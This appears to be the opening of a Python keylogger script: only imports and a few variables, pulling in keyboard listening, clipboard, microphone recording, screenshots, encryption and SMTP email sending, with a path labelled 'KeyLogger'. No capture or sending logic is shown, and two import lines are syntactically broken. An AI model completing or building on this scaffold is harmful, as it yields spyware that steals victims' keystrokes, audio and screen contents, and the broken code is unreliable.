#libraries
from email.mime.multipart import MIMEMultipart  
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket 
import platform 

import win32clipboard

import pynput.keyboard import Key,listener

import time 
import os

from scipy.io.wavfile import write 
import sounddevice as sd

import cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process,freeze_support
from PIL import ImageGrab 


key_info="key_log.txt" 
file_path = "c:\\Users\\Alpha\\Desktop\\Project\\Si\\KeyLogger"
extend="\\"
 